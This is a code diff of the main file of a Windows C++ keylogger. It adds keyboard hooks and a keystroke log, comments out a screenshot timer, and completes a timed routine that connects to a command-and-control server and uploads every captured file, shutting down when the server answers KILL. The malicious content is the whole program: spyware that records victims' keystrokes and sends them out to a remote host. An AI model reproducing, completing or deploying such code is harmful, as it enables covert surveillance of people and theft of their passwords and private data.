@@ -7,11 +7,12 @@
 // TODO see about exiting without joining thread (is it dangerous)
 // TODO delete all files when kill response is reached
 
-#include <iostream>
-#include <filesystem>
-#include <windows.h>
+
 
 #include "Settings.h"
+
+#include "Socket.h"
+#include <windows.h>
 
 #include "Utils.h"
 #include "KeyConstants.h"
@@ -20,7 +21,9 @@
 #include "MailUtils.h"
 #include "KeyboardManager.h"
 #include "Screenshot.h"
-#include "Socket.h"
+
+#include <iostream>
+#include <filesystem>
 
 // LogTimer Handler function
 void WriteKeylog()
@@ -32,6 +35,8 @@ void WriteKeylog()
 	{
 		KeyboardManager::GetInstance().keylog = "";
 		IO::WriteAppLog("Appended to Master Log");
+
+		std::cout << "wrote to keylog" << std::endl;
 	}
 	else
 	{
@@ -43,41 +48,51 @@ void WriteKeylog()
 void SaveScreenshot()
 {
 	Screenshot ss;
-	ss.Save(a file path that is generated);
+	// ss.Save(a file path that is generated);
 }
 
 // dumpTimer Handler function
 void DumpCache()
 {
+	std::cout << "Attempting Dump" << std::endl;
 	// Open connection with comand and control server
-	Socket ccSocket(CC_HOSTNAME, CC_PORT);
-	if (!ccSocket.isActive())
+	ClientSocket ccSocket(CC_HOSTNAME, CC_PORT);
+	if (!ccSocket.IsActive())
 	{
-		IO::WriteAppLog("Connection to " + CC_HOSTNAME + + " on port " + CC_PORT + " failed");
+		IO::WriteAppLog("Connection to " + Utils::ToString(CC_HOSTNAME) + " on port " + Utils::ToString(CC_PORT) + " failed");
 
-		ccSocket.close();
+		ccSocket.Close();
 		return;	// Files will be left alone
 	}
 
-	for (each file)
-	{
-		RESPONSE_CODE res = ccSocket.sendFile(filename);	
-		if (res == KILL)
+	try {
+		for (const auto& entry : std::filesystem::directory_iterator(IO::GetOutputPath(false)))
 		{
-			KeyboardManager::GetInstance().UninstallHooks();
-			// TODO delete all files
-			exit(0);
-		}
-		else if (res == SUCCESS)
-		{
-			// TODO delete file
-			IO::WriteAppLog("Successfully sent file [" + filename + "]");
-		}
-		else
-		{
-			IO::WriteAppLog("File [" + filename + "] failed to send");
+			std::string filename = Utils::ToString(entry.path());
+			RESPONSE_CODE res = ccSocket.SendFile(filename);
+			if (res == KILL)
+			{
+				KeyboardManager::GetInstance().UninstallHooks();
+				// TODO delete all files
+				exit(0);
+			}
+			else if (res == SUCCESS)
+			{
+				// TODO delete file
+				IO::WriteAppLog("Successfully sent file [" + filename + "]");
+			}
+			else
+			{
+				IO::WriteAppLog("File [" + filename + "] failed to send");
+			}
 		}
 	}
+	catch (std::filesystem::filesystem_error e)
+	{
+		IO::WriteAppLog("Failed to dump because output directory does not exist");
+	}
+
+	ccSocket.Close();
 }
 
 int main(int argc, char** argv)
@@ -94,9 +109,9 @@ int main(int argc, char** argv)
 	IO::WriteAppLog("Log Timer Started");
 
 	// Create and Start Screenshot Timer
-	Timer screenshotTimer(SaveScreenshot, SS_FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
-	screenshotTimer.Start(true);
-	IO::WriteAppLog("Screenshot Timer Started");
+	// Timer screenshotTimer(SaveScreenshot, SS_FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
+	// screenshotTimer.Start(true);
+	// IO::WriteAppLog("Screenshot Timer Started");
 
 	// Create and Start Dump Timer
 	Timer dumpTimer(DumpCache, DUMP_FREQUENCY_MINUTES * 1000 * 60, Timer::Infinite);
@@ -115,7 +130,7 @@ int main(int argc, char** argv)
 	KeyboardManager::GetInstance().UninstallHooks();
 
 	logTimer.Stop();
-	screenshotTimer.Stop();
+	// screenshotTimer.Stop();
 	dumpTimer.Stop();
 
 	return 0;
